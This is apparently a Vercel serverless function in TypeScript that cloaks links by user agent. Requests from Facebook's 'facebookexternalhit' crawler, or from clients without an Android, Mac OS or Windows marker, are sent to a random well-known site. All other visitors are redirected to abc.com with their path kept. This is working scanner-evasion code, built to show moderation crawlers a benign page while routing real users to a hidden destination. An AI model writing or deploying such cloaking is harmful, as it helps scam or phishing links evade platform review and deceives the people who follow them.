import { VercelRequest, VercelResponse } from '@vercel/node';

const topWebsites = [
  'https://www.youtube.com',
  'https://www.facebook.com',
  'https://www.twitter.com',
  'https://www.instagram.com',
  'https://www.amazon.com',
  'https://www.netflix.com',
  'https://www.linkedin.com',
  'https://www.reddit.com',
  'https://www.tiktok.com',
  'https://www.wikipedia.org',
  'https://www.yahoo.com',
  'https://www.whatsapp.com',
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.github.com',
  'https://www.pinterest.com',
  'https://www.twitch.tv',
  'https://www.spotify.com',
  'https://www.discord.com'
];

export default function handler(req: VercelRequest, res: VercelResponse) {
  const userAgent = req.headers['user-agent'] || '';
  
  // Check if user agent contains facebookexternalhit or doesn't contain android, mac os, windows
  if (
    userAgent.toLowerCase().includes('facebookexternalhit') ||
    !(
      userAgent.toLowerCase().includes('android') ||
      userAgent.toLowerCase().includes('mac os') ||
      userAgent.toLowerCase().includes('windows')
    )
  ) {
    // Redirect to random top website
    const randomSite = topWebsites[Math.floor(Math.random() * topWebsites.length)];
    return res.redirect(307, randomSite);
  }
  
  // Get the path from the URL, excluding query parameters
  const path = req.url?.split('?')[0] || '/';
  
  // Redirect to abc.com with the path
  return res.redirect(307, `https://abc.com${path}`);
}
